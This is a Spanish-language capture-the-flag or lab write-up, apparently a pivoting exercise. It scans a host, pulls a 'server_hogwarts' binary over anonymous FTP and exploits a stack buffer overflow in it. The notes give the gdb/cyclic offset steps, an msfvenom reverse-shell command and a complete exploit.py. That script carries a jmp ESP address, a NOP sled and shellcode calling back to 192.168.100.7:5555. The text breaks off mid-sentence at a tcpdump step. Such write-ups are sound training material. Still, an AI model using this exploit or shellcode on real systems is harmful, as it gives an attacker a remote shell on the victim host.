[[192.168.100.7(Nagini)]]

Haremos un [[NMAP]]
`nmap -sT -Pn -p- --open -T5 -v -n 192.168.100.5`

```python
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1
9898/tcp open  monkeycom
```

Vemos que el puerto del FTP esta activado así que vamos a probar a conectarnos, vemos que se puede acceder como usuarios `anonymous`

Vemos un binario llamado `server_hogwarts` así que con strace vamos a ver que es lo que hace y en que consiste: `strace ./server_hogwarts`, vemos que lo que realiza es montar un servidor por el puerto `9898`

Si ejecutamos el binario podremos acceder a el con netcat usando `nc localhost 9898` que es el puerto que estaba abierto durante el nmap.
El binario pide un input así que si no se ha definido bien un tamaño de buffer sin sanitizarlo se podría acontecer un bufferoverflow

Para poder realizar esto nos ejecutaremos el programa con la herramienta de gdb: `gdb ./server_hpgwarts -q` y para correr la herramienta usaremos la r una vez dentro de gdb.

Y en la otra terminal nos conectamos con netcat e introducimos todas las "A" posibles, y llenaremos el EIP de "A" o en hexadecimal 4141414141.

Si ejecutamos checsec nos mostrara si NX esta desactivado que nos permitirá hacer que un flujo de la pila se interprete cómo shellcode

En gdb haremos `cyclic 1024` para que nos cree un patrón de letras para identificar donde se llena el EIP
Una vez se llena el EIP copiamos el valor hexadecimal y ejecutamos `cyclic -o 0x62616164` y te dice en que bite esta el offset

Ahora para apuntar al EIP directamente usaremos el siguiente comando de python para llenar el EIP y verificar que se llena de "B" `python3 -c 'print("A"*112 + "B"*4 +"C"*100)'` y al llenarlo nuestro ESP apunta al comienzo de las letra "C" 

Ahora tenemos que hacer que EIP apunte directamente al ESP para que una vez salte a este se ejecute un shellcode

Necesitaremos realizar un shellcode que haremos con msfvenom:
`msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.7 LPORT=5555 -b '\x00\x0a\x0d' -f py -v shellcode`

Usaremos objdump para encontrar el OpCode que hace el salto al ESP
Para saber a donde se corresponde el OpCode usaremos `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` e introducimos `jmp ESP` nos dice que el OpCode corresponde a `FFE4`

Ahora objdum ejecutamos:
`objdump -D server_hogwarts| grep "ff e4"`

Nos mostrara direcciones que realizan ese salto que buscábamos en este caso: ``
`8049d55` tiene que estar en little endian así que le damos la vuelta en el código

Vamos a realizar un `exploit.py` para realizar esto:
```python
#!/usr/bin/python3

import socket

offset = 112
before_eip = b"A"*offset

eip = b"\x55\x9d\x04\x08" # 8049d55 jump ESP

shellcode = b""
shellcode += b"\xdb\xd8\xd9\x74\x24\xf4\xb8\x74\xc6\xd0\xaa"
shellcode += b"\x5b\x29\xc9\xb1\x12\x31\x43\x17\x03\x43\x17"
shellcode += b"\x83\x9f\x3a\x32\x5f\x6e\x18\x44\x43\xc3\xdd"
shellcode += b"\xf8\xee\xe1\x68\x1f\x5e\x83\xa7\x60\x0c\x12"
shellcode += b"\x88\x5e\xfe\x24\xa1\xd9\xf9\x4c\xf2\xb2\x9e"
shellcode += b"\x89\x9a\xc0\x5e\x84\xe9\x4c\xbf\x16\x6b\x1f"
shellcode += b"\x11\x05\xc7\x9c\x18\x48\xea\x23\x48\xe2\x9b"
shellcode += b"\x0c\x1e\x9a\x0b\x7c\xcf\x38\xa5\x0b\xec\xee"
shellcode += b"\x66\x85\x12\xbe\x82\x58\x54"

after_eip = b"\x90"*32 + shellcode # ESP

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.5", 9898))
s.send(payload)
s.close()
```

En la maquina [[192.168.100.7(Nagini)]] con socat deberemos configurar el renvio de paquetes



Una vez tenemos la shell en el directorio de `/root` encontramos un archivo `notes.txt` que nos dice que han detectado una entrada de un usuario por ftp, asi que con tcpdump -i eth0 port ftp or ftp-dat